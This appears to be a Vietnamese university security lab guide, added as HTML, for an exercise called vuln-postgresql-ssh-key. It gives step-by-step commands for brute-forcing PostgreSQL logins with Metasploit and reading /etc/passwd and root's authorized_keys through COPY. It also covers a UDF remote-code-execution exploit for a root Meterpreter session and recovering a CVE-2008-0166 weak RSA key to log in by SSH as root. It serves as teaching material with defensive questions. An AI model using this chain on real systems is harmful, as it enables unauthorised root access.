@@ -1,0 +1,684 @@
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Hướng dẫn thực hành Postgresql SSH Key</title>
+<style>* {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: "Times New Roman", Times, serif;
+      font-size: 13pt;
+      line-height: 1.8;
+      color: #1a1a1a;
+      background: #f4f6f9;
+      padding: 30px 20px;
+    }
+    .page {
+      max-width: 860px;
+      margin: 0 auto;
+      background: #fff;
+      padding: 50px 60px;
+      border: 1px solid #d0d5dd;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
+    }
+    .header {
+      text-align: center;
+      border-bottom: 3px solid #003087;
+      padding-bottom: 20px;
+      margin-bottom: 30px;
+    }
+    .header .institution {
+      font-size: 11pt;
+      color: #555;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    .header h1 {
+      font-size: 20pt;
+      color: #003087;
+      margin-top: 8px;
+      font-weight: bold;
+    }
+    .header .subtitle {
+      font-size: 13pt;
+      color: #444;
+      margin-top: 4px;
+      font-style: italic;
+    }
+    .header .meta {
+      margin-top: 14px;
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+    .badge {
+      display: inline-block;
+      padding: 4px 14px;
+      border-radius: 20px;
+      font-size: 10pt;
+      font-weight: bold;
+    }
+    .badge-medium {
+      background: #fff3cd;
+      color: #856404;
+      border: 1px solid #ffc107;
+    }
+    .badge-attack {
+      background: #fde8e8;
+      color: #8b0000;
+      border: 1px solid #f5a0a0;
+    }
+    .badge-tool {
+      background: #e6f4ea;
+      color: #216e39;
+      border: 1px solid #b7dfc4;
+    }
+    h2 {
+      font-size: 14pt;
+      color: #003087;
+      border-left: 5px solid #003087;
+      padding-left: 10px;
+      margin: 32px 0 12px;
+      font-weight: bold;
+    }
+    h3 {
+      font-size: 12.5pt;
+      color: #1a5276;
+      margin: 10px 0 8px;
+      font-weight: bold;
+    }
+    h4 {
+      font-size: 12pt;
+      color: #2e4053;
+      margin: 16px 0 6px;
+      font-weight: bold;
+    }
+    p {
+      margin-bottom: 10px;
+    }
+    ul,
+    ol {
+      margin: 8px 0 10px 24px;
+    }
+    li {
+      margin-bottom: 5px;
+    }
+    code {
+      background: #f0f0f0;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      padding: 2px 7px;
+      font-family: "Courier New", monospace;
+      font-size: 11pt;
+      color: #b03a2e;
+    }
+    pre {
+      background: #1e1e2e;
+      color: #cdd6f4;
+      border-radius: 8px;
+      padding: 16px 20px;
+      font-family: "Courier New", monospace;
+      font-size: 10.5pt;
+      overflow-x: auto;
+      margin: 10px 0 14px;
+      line-height: 1.6;
+      white-space: pre-wrap;
+    }
+    pre .cmd {
+      color: #89dceb;
+    }
+    pre .comment {
+      color: #8b93a8;
+      font-style: italic;
+    }
+    pre .prompt {
+      color: #a6e3a1;
+    }
+    .box {
+      border-radius: 6px;
+      padding: 12px 16px;
+      margin: 14px 0;
+      font-size: 12pt;
+    }
+    .box-info {
+      background: #e8f4fd;
+      border-left: 5px solid #2196f3;
+    }
+    .box-warning {
+      background: #fff3cd;
+      border-left: 5px solid #ffc107;
+    }
+    .box-danger {
+      background: #fdecea;
+      border-left: 5px solid #f44336;
+    }
+    .box-success {
+      background: #e8f5e9;
+      border-left: 5px solid #4caf50;
+    }
+    .box-note {
+      background: #f3e5f5;
+      border-left: 5px solid #9c27b0;
+    }
+    .box strong {
+      display: inline-block;
+      margin-bottom: 4px;
+    }
+    .topology {
+      text-align: center;
+      margin: 18px 0;
+    }
+    .topo-diagram {
+      display: inline-flex;
+      align-items: center;
+      gap: 0;
+      background: #f8fafc;
+      border: 1px solid #cdd0d8;
+      border-radius: 10px;
+      padding: 24px 32px;
+      font-family: "Courier New", monospace;
+      font-size: 11pt;
+    }
+    .topo-node {
+      background: #003087;
+      color: #fff;
+      border-radius: 8px;
+      padding: 14px 18px;
+      text-align: center;
+      min-width: 180px;
+    }
+    .topo-node .node-label {
+      font-size: 10pt;
+      opacity: 0.9;
+    }
+    .topo-node .node-ip {
+      font-size: 9pt;
+      opacity: 0.75;
+      font-style: italic;
+    }
+    .topo-arrow {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: 0 20px;
+      gap: 8px;
+    }
+    .topo-arrow .arrow-label {
+      font-size: 9.5pt;
+      font-weight: bold;
+      color: #27ae60;
+    }
+    .topo-arrow .arrow-line {
+      width: 120px;
+      height: 2px;
+      background: #27ae60;
+    }
+    /* ===== TASK BLOCKS ===== */
+    .task-block {
+      border: 1px solid #b0c4de;
+      border-radius: 8px;
+      margin: 20px 0;
+      overflow: hidden;
+    }
+    .task-header {
+      background: #003087;
+      color: #fff;
+      padding: 10px 18px;
+      font-size: 12.5pt;
+      font-weight: bold;
+    }
+    .task-body {
+      padding: 16px 20px;
+    }
+    /* ===== TABLES ===== */
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 14px 0;
+      font-size: 12pt;
+    }
+    th {
+      background: #003087;
+      color: #fff;
+      padding: 10px 12px;
+      text-align: left;
+    }
+    td {
+      padding: 9px 12px;
+      border: 1px solid #d0d5dd;
+      vertical-align: top;
+    }
+    tr:nth-child(even) td {
+      background: #f5f7fa;
+    }
+    .chain-wrapper {
+      background: #f8fafc;
+      border: 1px solid #cdd0d8;
+      border-radius: 10px;
+      padding: 14px 18px;
+      margin: 16px 0;
+    }
+    .chain-wrapper ol {
+      margin-bottom: 0;
+    }
+    /* ===== FOOTER ===== */
+    .footer {
+      margin-top: 40px;
+      border-top: 1px solid #d0d5dd;
+      padding-top: 14px;
+      text-align: center;
+      font-size: 10pt;
+      color: #777;
+    }
+    @media print {
+      body {
+        background: #fff;
+        padding: 0;
+      }
+      .page {
+        border: none;
+        box-shadow: none;
+        padding: 30px 40px;
+        max-width: 100%;
+      }
+    }</style>
+<div class="page">
+  <div class="header">
+    <div class="institution">Học viện Công nghệ Bưu chính Viễn thông - SecLab PTIT</div>
+    <h1>HƯỚNG DẪN THỰC HÀNH</h1>
+    <div class="subtitle">Postgresql SSH Key - Khai thác lỗ hổng PostgreSQL kết hợp với khóa RSA và SSH</div>
+    <div class="meta">
+      <span class="badge badge-medium">Mức độ: Trung bình</span>
+      <span class="badge badge-attack">Malware &amp; Attack Technologies</span>
+      <span class="badge badge-attack">Cryptography</span>
+      <span class="badge badge-tool">Metasploit, psql, ssh, fgrep</span>
+    </div>
+  </div>
+  <h2>1. Giới thiệu Lab</h2>
+  <table>
+    <tbody>
+      <tr>
+        <th>Thông tin</th>
+        <th>Chi tiết</th>
+      </tr>
+      <tr>
+        <td>Tên Lab</td>
+        <td>
+          <code>vuln-postgresql-ssh-key</code>
+        </td>
+      </tr>
+      <tr>
+        <td>Mức độ</td>
+        <td>Trung bình</td>
+      </tr>
+      <tr>
+        <td>Công cụ sử dụng</td>
+        <td>
+          <code>msfconsole</code>, 
+          <code>psql</code>, 
+          <code>ssh</code>, 
+          <code>fgrep</code>, 
+          <code>awk</code>, 
+          <code>nmap</code>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+  <h3>Mục tiêu học tập</h3>
+  <p>Bài lab giúp sinh viên hiểu về cặp khóa RSA và cách kết hợp khai thác chuỗi lỗ hổng liên hoàn trên PostgreSQL để
+      đăng nhập vào máy nạn nhân bằng khóa bí mật (Private Key). Thông qua bài thực hành, sinh viên nhận thức rõ hậu quả của
+      việc chạy dịch vụ mạng dưới đặc quyền 
+    <code>root</code> và sử dụng thư viện mã hóa lỗi thời.
+  </p>
+  <h3>Kỹ năng đạt được</h3>
+  <ul>
+    <li>Sử dụng 
+      <code>nmap</code> để rà quét và xác định dịch vụ PostgreSQL (5432) và SSH (22) đang mở.
+    </li>
+    <li>Sử dụng module 
+      <code>postgres_login</code> trong Metasploit để dò thông tin đăng nhập PostgreSQL.
+    </li>
+    <li>Sử dụng 
+      <code>psql</code> để tương tác với cơ sở dữ liệu và trích xuất dữ liệu nhạy cảm (Data Exfiltration).
+    </li>
+    <li>Khai thác lỗ hổng UDF RCE (
+      <code>postgres_payload</code>) để chiếm phiên Meterpreter với quyền root.
+    </li>
+    <li>Hiểu và áp dụng tấn công bẻ khóa dựa trên lỗ hổng Predictable PRNG (CVE-2008-0166).</li>
+    <li>Thiết lập phiên SSH hợp pháp với khóa bí mật thu thập được để duy trì truy cập.</li>
+  </ul>
+  <h2>2. Kịch bản</h2>
+  <strong>Tình huống:</strong>
+  <br>
+  <p>Một hệ thống nội bộ đang vận hành máy chủ PostgreSQL và cho phép truy nhập từ xa bằng SSH. Quản trị viên tin rằng
+      cơ chế đăng nhập bằng khóa RSA đã đủ an toàn, nhưng hệ thống vẫn còn các cấu hình yếu: mật khẩu PostgreSQL dễ đoán,
+      dịch vụ cơ sở dữ liệu chạy với quyền quá cao và bộ khóa RSA được tạo từ thư viện OpenSSL cũ.</p>
+  <p>Sinh viên đóng vai trò người kiểm thử được cấp quyền làm việc trong cùng mạng nội bộ với máy chủ. Nhiệm vụ là
+      kiểm chứng từng điểm yếu, thu thập khóa công khai trên máy nạn nhân, tìm khóa bí mật tương ứng và chứng minh rằng
+      kẻ tấn công có thể đăng nhập SSH với quyền 
+    <code>root</code> nếu hệ thống không được cấu hình đúng.
+  </p>
+  <p>
+    <strong>Vai trò của sinh viên:</strong>
+  </p>
+  <ul>
+    <li>Thực hiện kiểm thử trong phạm vi bài lab và ghi lại địa chỉ IP của các máy tham gia.</li>
+    <li>Đối chiếu kết quả từng nhiệm vụ với nguyên nhân bảo mật tương ứng.</li>
+    <li>Rút ra biện pháp phòng chống phù hợp cho dịch vụ PostgreSQL và SSH.</li>
+  </ul>
+  <h3>2.1 Chuỗi tấn công tổng quan</h3>
+  <div class="chain-wrapper">
+    <ol>
+      <li>Trinh sát mạng để xác định máy nạn nhân và các cổng dịch vụ đang mở.</li>
+      <li>Dò thông tin đăng nhập PostgreSQL bằng Metasploit.</li>
+      <li>Kết nối PostgreSQL và đọc khóa công khai SSH của tài khoản 
+        <code>root</code>.
+      </li>
+      <li>Khai thác UDF RCE để đọc tệp yêu cầu trong hệ thống.</li>
+      <li>Đối chiếu khóa RSA, tìm khóa bí mật và đăng nhập SSH.</li>
+    </ol>
+  </div>
+  <h3>2.2 Sơ đồ mạng</h3>
+  <div class="topology">
+    <div class="topo-diagram">
+      <div class="topo-node">
+        <div>attacker</div>
+        <div class="node-label">Kali Linux, công cụ kiểm thử</div>
+      </div>
+      <div class="topo-arrow">
+        <div class="arrow-label">PostgreSQL 5432, SSH 22</div>
+        <div class="arrow-line"></div>
+        <div style="font-size: 9pt; color: #555;">Lưu lượng trong cùng mạng LAN</div>
+      </div>
+      <div class="topo-node">
+        <div>victim</div>
+        <div class="node-label">PostgreSQL và SSH</div>
+        <div class="node-ip">192.168.1.2</div>
+      </div>
+    </div>
+  </div>
+    <!-- ==================== SECTION 3: KIẾN THỨC BỔ TRỢ ==================== -->
+  <h2>3. Kiến thức bổ trợ</h2>
+  <h3>3.1 Lỗ hổng PostgreSQL UDF RCE</h3>
+  <p>Sinh viên cần được bổ trợ kiến thức về cách hệ quản trị cơ sở dữ liệu tương tác với hệ điều hành.
+      Module 
+    <code>postgres_payload</code> lợi dụng tính năng 
+    <strong>User Defined Functions (UDF)</strong>:
+      khi tài khoản có đặc quyền cao (như 
+    <code>postgres</code> chạy với quyền 
+    <code>root</code>), nó có thể tải
+      một thư viện liên kết động (
+    <code>.so</code> trên Linux) vào thư mục hệ thống của nạn nhân thông qua câu lệnh SQL,
+      từ đó ép dịch vụ thực thi mã và trả về shell điều khiển cho attacker.
+  </p>
+  <h3>3.2 Cơ chế xác thực SSH bằng cặp khóa RSA</h3>
+  <p>Sinh viên cần hiểu rõ kiến trúc mật mã bất đối xứng RSA ứng dụng trong dịch vụ SSH:</p>
+  <ul>
+    <li>
+      <strong>Public Key (Khóa công khai):</strong> Được lưu tại file 
+      <code>/root/.ssh/authorized_keys</code>
+        trên máy chủ victim. Bất kỳ ai cũng có thể nhìn thấy khóa này.
+    </li>
+    <li>
+      <strong>Private Key (Khóa bí mật):</strong> Do người dùng nắm giữ. Ai có Private Key phù hợp sẽ đăng nhập được.
+    </li>
+    <li>
+      <strong>Bản chất bài lab:</strong> Khi attacker thu được Private Key trùng khớp với Public Key lưu trên victim,
+        dịch vụ SSH sẽ cho phép đăng nhập thẳng vào hệ thống với quyền 
+      <code>root</code> mà không cần mật khẩu.
+    </li>
+  </ul>
+  <h3>3.3 Lỗ hổng Predictable PRNG CVE-2008-0166</h3>
+  <p>CVE-2008-0166 là lỗi sinh số ngẫu nhiên trong OpenSSL trên Debian và Ubuntu. Lỗi này làm không gian khóa RSA bị
+      thu hẹp nghiêm trọng, khiến kẻ tấn công có thể chuẩn bị trước một kho khóa và đối chiếu với khóa công khai của
+      nạn nhân. Sinh viên có thể đọc thêm tại
+    <a href="https://nvd.nist.gov/vuln/detail/CVE-2008-0166">NVD CVE-2008-0166</a>.
+  </p>
+  <h2>4. Các nhiệm vụ của bài thực hành</h2>
+  <div class="box box-info" style="margin-bottom: 18px;">
+    <p>Để tải bài thực hành theo tên lab đã chuẩn hóa, sinh viên thực hiện câu lệnh:</p>
+    <p style="margin: 8px 0 12px 0;">
+      <code style="display: inline-block; padding: 6px 12px; background: #faf0f0; border: 1px solid #f5d6d6; color: #b03a2e; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 11pt; word-break: break-all;">imodule https://raw.githubusercontent.com/thanhdat317/Imodule_labtainer/master/vuln-postgresql-ssh-key.tar</code>
+    </p>
+    <p>Để khởi động bài thực hành, sinh viên dùng câu lệnh:</p>
+    <p style="margin: 8px 0 0 0;">
+      <code style="display: inline-block; padding: 6px 12px; background: #faf0f0; border: 1px solid #f5d6d6; color: #b03a2e; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 11pt; word-break: break-all;">labtainer -r vuln-postgresql-ssh-key</code>
+    </p>
+  </div>
+  <p style="margin-bottom: 20px;">Sau khi khởi động xong, hai terminal ảo sẽ xuất hiện. Terminal 
+    <strong>attacker</strong> là máy thực hiện tấn công, 
+      còn terminal 
+    <strong>victim</strong> là máy mục tiêu chứa cơ sở dữ liệu PostgreSQL và dịch vụ SSH.
+  </p>
+    <!-- ===== NHIỆM VỤ 1 ===== -->
+  <div class="task-block">
+    <div class="task-header">Nhiệm vụ 1: Trinh sát mạng, kiểm tra kết nối và rà quét cổng</div>
+    <div class="task-body">
+      <p>Trước khi khai thác, sinh viên tự kiểm tra sự kết nối mạng giữa máy 
+        <strong>attacker</strong>
+          và máy 
+        <strong>victim</strong>, đảm bảo hai máy có thể liên lạc được với nhau trong cùng mạng LAN.
+      </p>
+      <div class="box box-warning">
+        <strong>Lưu ý:</strong> Ghi lại địa chỉ IP của cả hai máy vì thông tin này sẽ được dùng trong các nhiệm vụ tiếp theo.
+      </div>
+      <h4>Rà quét dịch vụ bằng nmap</h4>
+      <p>Từ terminal 
+        <code>attacker</code>, xác nhận hai cổng mục tiêu đang mở và xác định phiên bản dịch vụ:
+      </p>
+      <pre class="language-markup"><span class="cmd">nmap -sV -p5432,22 &lt;ip_victim&gt;</span></pre>
+      <div class="box box-success">
+        <strong>Điều kiện hoàn thành nhiệm vụ:</strong> Xác định được địa chỉ IP của máy victim và thấy cổng
+        <code>5432</code> của PostgreSQL cùng cổng 
+        <code>22</code> của SSH đang mở.
+      </div>
+      <div class="box box-danger">
+        <strong>Câu hỏi 1:</strong>
+        <br>
+          Vì sao sinh viên cần xác định dịch vụ đang mở trước khi tiến hành kiểm thử?
+        <br>
+        <strong>Trả lời:</strong> ___________________________________________
+      </div>
+    </div>
+  </div>
+    <!-- ===== NHIỆM VỤ 2 ===== -->
+  <div class="task-block">
+    <div class="task-header">Nhiệm vụ 2: Dò thông tin đăng nhập PostgreSQL</div>
+    <div class="task-body">
+      <p>Sử dụng module 
+        <code>postgres_login</code> trong Metasploit để thực hiện tấn công dò quét
+          thông tin đăng nhập vào dịch vụ PostgreSQL của máy victim.
+      </p>
+      <h4>Bước 1: Khởi chạy Metasploit và nạp module</h4>
+      <pre class="language-markup"><span class="cmd">sudo msfconsole</span>
+<span class="comment"># Sau khi msfconsole khởi động:</span>
+<span class="cmd">use auxiliary/scanner/postgres/postgres_login</span></pre>
+      <h4>Bước 2: Cấu hình và chạy module</h4>
+      <pre class="language-markup"><span class="cmd">set RHOSTS &lt;ip_victim&gt;</span>
+<span class="cmd">set STOP_ON_SUCCESS true</span>
+<span class="cmd">exploit</span></pre>
+      <div class="box box-warning">
+        <strong>Lưu ý:</strong> Metasploit có thể hiển thị cảnh báo
+        <code>[!] No active DB - Credential data will not be saved!</code> và nhiều dòng đỏ
+        <code>[-] LOGIN FAILED</code>. Đây là 
+        <em>hành vi bình thường</em> vì module đang thử từng
+          cặp thông tin đăng nhập. Hãy cuộn xuống cuối output để tìm dòng thành công:
+        <pre style="margin-top:8px; background:#1e3a1e;" class="language-markup"><span style="color:#a6e3a1;">[+] Login Successful: postgres:postgres</span></pre>
+      </div>
+      <div class="box box-success">
+        <strong>Điều kiện hoàn thành nhiệm vụ:</strong> Thu được username và password của tài khoản PostgreSQL.
+          Ghi lại thông tin này để sử dụng ở Nhiệm vụ 3.
+      </div>
+      <div class="box box-danger">
+        <strong>Câu hỏi 2:</strong>
+        <br>
+          Mật khẩu mặc định yếu tạo ra rủi ro gì cho dịch vụ cơ sở dữ liệu?
+        <br>
+        <strong>Trả lời:</strong> ___________________________________________
+      </div>
+    </div>
+  </div>
+    <!-- ===== NHIỆM VỤ 3 ===== -->
+  <div class="task-block">
+    <div class="task-header">Nhiệm vụ 3: Kết nối PostgreSQL và trích xuất khóa công khai</div>
+    <div class="task-body">
+      <p>Sử dụng mật khẩu tìm được ở Nhiệm vụ 2 để kết nối trực tiếp vào giao diện tương tác cơ sở dữ liệu.
+          Sau đó dùng quyền hiện có của tài khoản 
+        <code>postgres</code> để đọc các tệp hệ thống cần quan sát trên máy victim.
+      </p>
+      <h4>Bước 1: Kết nối vào giao diện PostgreSQL</h4>
+      <p>Từ terminal 
+        <code>attacker</code>, kết nối vào máy victim bằng client 
+        <code>psql</code>:
+      </p>
+      <pre class="language-markup"><span class="cmd">psql -h &lt;ip_victim&gt; -U postgres</span></pre>
+      <p>Nếu terminal tự mở trình phân trang khi kết quả dài, tắt pager trước khi truy vấn:</p>
+      <pre class="language-markup"><span class="cmd">export PAGER=cat</span>
+<span class="cmd">export PSQL_PAGER=cat</span></pre>
+      <h4>Bước 2: Đọc file tài khoản hệ thống Linux của victim</h4>
+      <p>Sau khi vào giao diện 
+        <code>psql</code> (dấu nhắc 
+        <code>postgres=#</code>), thực thi các lệnh SQL:
+      </p>
+      <pre class="language-markup"><span class="cmd">CREATE TABLE accounts (linux_users TEXT);</span>
+<span class="cmd">COPY accounts FROM '/etc/passwd';</span>
+<span class="cmd">SELECT linux_users FROM accounts WHERE linux_users LIKE '%bash%';</span></pre>
+      <h4>Bước 3: Đọc và trích xuất khóa công khai SSH của root</h4>
+      <pre class="language-markup"><span class="cmd">CREATE TABLE sshkeys (auth_key TEXT);</span>
+<span class="cmd">COPY sshkeys FROM '/root/.ssh/authorized_keys';</span></pre>
+      <h4>Bước 4: Thoát ra Terminal Linux và lưu khóa công khai</h4>
+      <p>Thoát khỏi giao diện 
+        <code>psql</code> bằng lệnh 
+        <code>\q</code>:
+      </p>
+      <pre class="language-markup"><span class="cmd">\q</span></pre>
+      <p>Quay lại Terminal Linux của attacker, truy vấn và lưu khóa công khai ra file:</p>
+      <pre class="language-markup"><span class="cmd">psql -h &lt;ip_victim&gt; -U postgres -c 'SELECT auth_key FROM sshkeys LIMIT 1' | tee public_key.txt</span>
+<span class="cmd">cat public_key.txt</span></pre>
+      <div class="box box-success">
+        <strong>Điều kiện hoàn thành nhiệm vụ:</strong> File 
+        <code>public_key.txt</code> chứa chuỗi Public Key RSA-2048
+          bắt đầu bằng 
+        <code>ssh-rsa AAAA...</code>. Đây là dữ liệu đầu vào cho Nhiệm vụ 5.
+      </div>
+      <div class="box box-note">
+        <strong>Ý nghĩa kỹ thuật:</strong> PostgreSQL chạy với quyền root cho phép lệnh
+        <code>COPY ... FROM &lt;file&gt;</code> đọc bất kỳ file nào trên hệ thống, kể cả
+        <code>/etc/passwd</code> và 
+        <code>/root/.ssh/authorized_keys</code>. Đây là hậu quả trực tiếp
+          của việc chạy dịch vụ mạng dưới đặc quyền tối cao (Root Daemon).
+      </div>
+      <div class="box box-danger">
+        <strong>Câu hỏi 3:</strong>
+        <br>
+          Vì sao tài khoản 
+        <code>postgres</code> có thể đọc 
+        <code>/root/.ssh/authorized_keys</code>
+          và điều này vi phạm nguyên tắc bảo mật nào?
+        <br>
+        <strong>Trả lời:</strong> ___________________________________________
+      </div>
+    </div>
+  </div>
+    <!-- ===== NHIỆM VỤ 4 ===== -->
+  <div class="task-block">
+    <div class="task-header">Nhiệm vụ 4: Thực thi mã từ xa qua lỗ hổng UDF PostgreSQL</div>
+    <div class="task-body">
+      <p>Module 
+        <code>postgres_payload</code> khai thác tính năng User Defined Functions (UDF) của PostgreSQL
+          để tải thư viện động (
+        <code>.so</code>) lên hệ thống victim và thực thi mã từ xa,
+          trả về phiên 
+        <strong>Meterpreter</strong> với quyền của tiến trình PostgreSQL.
+      </p>
+      <div class="box box-warning">
+        <strong>Lưu ý:</strong> Vì PostgreSQL chạy dưới quyền root, phiên Meterpreter thu được
+          sẽ có đặc quyền root, cho phép đọc bất kỳ file nào trên hệ thống, bao gồm
+        <code>/root/fileview.txt</code>, mà không cần thay đổi quyền hệ thống.
+      </div>
+      <h4>Bước 1: Nạp module exploit trong msfconsole</h4>
+      <pre class="language-markup"><span class="cmd">use exploit/linux/postgres/postgres_payload</span>
+<span class="cmd">set RHOSTS &lt;ip_victim&gt;</span>
+<span class="cmd">exploit</span></pre>
+      <h4>Bước 2: Đọc file flag từ phiên Meterpreter</h4>
+      <p>Sau khi exploit thành công, terminal sẽ chuyển sang giao diện dòng lệnh Meterpreter. Thực thi lệnh sau:</p>
+      <pre class="language-markup"><span class="cmd">cat /root/fileview.txt</span></pre>
+      <div class="box box-success">
+        <strong>Điều kiện hoàn thành nhiệm vụ:</strong> Đọc được nội dung file 
+        <code>/root/fileview.txt</code>
+          trực tiếp từ phiên Meterpreter với quyền root.
+      </div>
+      <div class="box box-danger">
+        <strong>Câu hỏi 4:</strong>
+        <br>
+          Nêu ít nhất hai biện pháp cấu hình để hạn chế kịch bản khai thác này.
+        <br>
+        <strong>Trả lời:</strong> ___________________________________________
+      </div>
+    </div>
+  </div>
+    <!-- ===== NHIỆM VỤ 5 ===== -->
+  <div class="task-block">
+    <div class="task-header">Nhiệm vụ 5: Bẻ khóa RSA và đăng nhập SSH bằng khóa bí mật</div>
+    <div class="task-body">
+      <p>Áp dụng kỹ thuật tấn công bẻ khóa dựa trên lỗ hổng 
+        <strong>Predictable PRNG</strong>
+          (CVE-2008-0166) để tìm ra Private Key tương ứng với Public Key đã thu thập ở Nhiệm vụ 3.
+          Sau đó sử dụng Private Key để đăng nhập SSH hợp pháp với quyền root.
+      </p>
+      <div class="box box-info">
+        <strong>Bối cảnh kỹ thuật:</strong>
+        <br>
+          Do lỗ hổng CVE-2008-0166, thư viện OpenSSL trên Debian/Ubuntu chỉ có thể tạo ra tối đa
+        <strong>32.767 cặp khóa RSA-2048 duy nhất</strong>. Toàn bộ tập hợp khóa này đã được
+          tính toán trước và lưu sẵn tại thư mục 
+        <code>rsa/2048/</code> trên máy attacker.
+          Vì vậy, chỉ cần có Public Key của nạn nhân, attacker có thể tìm ra Private Key khớp
+          trong vài giây bằng cách so sánh với kho khóa được chuẩn bị trước.
+      </div>
+      <h4>Bước 1: Tìm Private Key bằng fgrep</h4>
+      <p>Trích xuất phần hash của Public Key và tìm kiếm trong kho khóa được sinh sẵn:</p>
+      <pre class="language-markup"><span class="cmd">grep "ssh-rsa" public_key.txt | awk '{print $2}' | sed 's/==$//' &gt; keyhash.txt</span>
+<span class="cmd">fgrep -f keyhash.txt rsa/2048/*pub | tee private_key.txt</span>
+<span class="cmd">cat private_key.txt</span></pre>
+      <div class="box box-warning">
+        <strong>Đọc kết quả:</strong> Output của lệnh 
+        <code>fgrep</code> trả về đường dẫn file
+          dạng 
+        <code>rsa/2048/xxxxxxxx-YYYY</code>. Phần tên file (ví dụ:
+        <code>57c3115d77c56390332dc5c49978627a-5429</code>) chính là tên Private Key tương ứng
+          mà sinh viên sẽ sử dụng ở Bước 2.
+      </div>
+      <h4>Bước 2: Đăng nhập SSH bằng Private Key</h4>
+      <p>Sử dụng Private Key tìm được để thiết lập phiên SSH hợp pháp với quyền root:</p>
+      <pre class="language-markup"><span class="cmd">ssh -i rsa/2048/&lt;tên_private_key&gt; root@&lt;ip_victim&gt;</span></pre>
+      <h4>Bước 3: Đọc file flag để hoàn thành nhiệm vụ</h4>
+      <pre class="language-markup"><span class="cmd">cat /root/fileview.txt</span></pre>
+      <div class="box box-success">
+        <strong>Điều kiện hoàn thành:</strong> Đăng nhập SSH thành công với quyền root và đọc được
+          nội dung 
+        <code>/root/fileview.txt</code>. Đây là minh chứng cho việc duy trì truy cập
+          (Persistent Access) thông qua khóa SSH bị xâm phạm.
+      </div>
+      <div class="box box-danger">
+        <strong>Câu hỏi 5:</strong>
+        <br>
+          Vì sao một lỗ hổng đã được vá từ năm 2008 vẫn có thể gây rủi ro trong thực tế?
+        <br>
+        <strong>Trả lời:</strong> ___________________________________________
+      </div>
+      <div class="box box-danger">
+        <strong>Câu hỏi 6:</strong>
+        <br>
+          Khi nào đăng nhập SSH bằng khóa RSA an toàn hơn đăng nhập bằng mật khẩu?
+        <br>
+        <strong>Trả lời:</strong> ___________________________________________
+      </div>
+    </div>
+  </div>
+  <div class="footer">
+    <p>Học viện Công nghệ Bưu chính Viễn thông - SecLab PTIT</p>
+  </div>
+</div>
